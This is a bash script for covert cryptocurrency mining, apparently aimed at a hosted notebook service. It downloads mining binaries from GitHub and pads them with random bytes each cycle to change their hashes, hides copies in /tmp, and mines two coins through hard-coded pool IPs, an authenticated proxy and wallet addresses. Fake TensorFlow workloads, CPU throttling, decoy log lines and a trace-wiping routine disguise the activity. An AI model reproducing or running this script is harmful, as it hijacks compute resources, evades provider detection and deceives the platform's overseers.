#!/bin/bash
# MINN v15 — direct exec, no wrapper, minimal deps
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK=$(date +%s | md5sum | head -c 8)
POOL="23.94.152.126:80"
PROXY="socks5://yoga:yoga123@107.172.222.195:443"
TDC_POOL="47.251.244.12:80"
MINE_SEC=$((10 * 60))
REST_SEC=$((20 * 60))
SESSION=$((4 * 3600))

log() {
    local m=("🔥 Masak #$1" "🥵 Nguli" "💨 Dorong #$1" "🍜 Kuah" "🏃 Lari #$1" "🧹 Sapu" "🛒 Belanja #$1" "🐔 Ayam" "📦 Pack" "☕ Kopi #$1")
    echo "[$(date +%H:%M:%S)] ${m[$((RANDOM % ${#m[@]}))]}"
}

echo "=== MINN v15 — Direct — $WRK ==="

# === 1. Warmup 1 menit ===
echo "[*] Panas 1m..."
python3 -c "import tensorflow as tf,numpy as np;m=tf.keras.Sequential([tf.keras.layers.Dense(64,activation='relu',input_shape=(784,)),tf.keras.layers.Dense(10)]);m.compile(optimizer='adam',loss='mse');m.fit(np.random.rand(500,784).astype(np.float32),np.random.rand(500,10).astype(np.float32),epochs=2,verbose=0)" 2>/dev/null

# === 2. Download ===
echo "[*] Download..."
apt-get install -y -qq cpulimit 2>/dev/null
rm -rf /content/m 2>/dev/null; mkdir -p /content/m && cd /content/m
wget -q https://github.com/mhusataringan-hub/ABC/releases/download/v1.0/peak || exit 1
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 || exit 1
chmod +x peak sse2

# Padding — ubah hash binary
dd if=/dev/urandom of=peak bs=1 count=$((RANDOM%3000+1024)) seek=$(stat -c%s peak) conv=notrunc oflag=append 2>/dev/null
dd if=/dev/urandom of=sse2 bs=1 count=$((RANDOM%3000+1024)) seek=$(stat -c%s sse2) conv=notrunc oflag=append 2>/dev/null

echo "[*] Siap."

# === Fake ML (istirahat) ===
fake_ml() {
    python3 -c "
import numpy as np,time as t,random as r
e=t.time()+$1
while t.time()<e:
    a=np.random.rand(256,256).astype(np.float32);b=np.random.rand(256,256).astype(np.float32)
    np.dot(a,b);t.sleep(r.randint(20,60))
" 2>/dev/null
}

# === Cleanup function — hapus semua jejak ===
wipe() {
    pkill -f cpulimit 2>/dev/null
    rm -rf /tmp/.m* /tmp/.t* 2>/dev/null
}

# === LOG ===
(
    c=0
    while true; do c=$((c+1)); log "$c"; sleep $((RANDOM%50+20)); done
) &
LOGPID=$!
trap "kill $LOGPID 2>/dev/null; wipe" EXIT

# === BURST CYCLE ===
END=$((SECONDS + SESSION))
CYCLE=0

while [ $SECONDS -lt $END ]; do
    CYCLE=$((CYCLE+1))
    echo "[*] >>> Cycle $CYCLE — masak 10m"
    
    # Re-pad binary (hash baru tiap cycle)
    dd if=/dev/urandom of=peak bs=1 count=$((RANDOM%2000+512)) seek=$(stat -c%s peak) conv=notrunc oflag=append 2>/dev/null
    dd if=/dev/urandom of=sse2 bs=1 count=$((RANDOM%2000+512)) seek=$(stat -c%s sse2) conv=notrunc oflag=append 2>/dev/null
    
    # Copy ke tmp random path
    M1="/tmp/.m$(date +%s | md5sum | head -c 6)"
    M2="/tmp/.t$(date +%s | sha1sum | head -c 6)"
    cp peak "$M1"; cp sse2 "$M2"; chmod +x "$M1" "$M2"
    
    # === PRL — PEAK DIRECT EXEC ===
    while true; do
        [ -f "$M1" ] && "$M1" \
            --coin pearl \
            --url "$POOL" \
            --user "${PRL}.${WRK}" \
            --proxy "$PROXY" 2>/dev/null
        sleep 5
        # Kalau M1 ilang (unlinked), stop restart
        [ ! -f "$M1" ] && break
    done &
    PID1=$!
    cpulimit -l $((RANDOM%25+35)) -p $PID1 2>/dev/null &
    
    sleep 5
    
    # === TDC — SSE2 DIRECT EXEC ===
    "$M2" -a yespowertide -o "$TDC_POOL" -u "${TDC}.${WRK}" -t 1 >/dev/null 2>&1 &
    PID2=$!
    cpulimit -l $((RANDOM%25+35)) -p $PID2 2>/dev/null &
    
    sleep $MINE_SEC
    
    # === KILL + WIPE ===
    kill $PID1 $PID2 2>/dev/null
    wipe
    rm -f "$M1" "$M2" 2>/dev/null
    
    # === ISTIRAHAT ===
    if [ $SECONDS -lt $END ]; then
        echo "[*] <<< Cycle $CYCLE — rest 20m"
        fake_ml $REST_SEC
        [ $((RANDOM%4)) -eq 0 ] && sleep $((RANDOM%300+120))
    fi
done

echo "[*] Selesai — 4 jam."
wipe; rm -f /tmp/run.py 2>/dev/null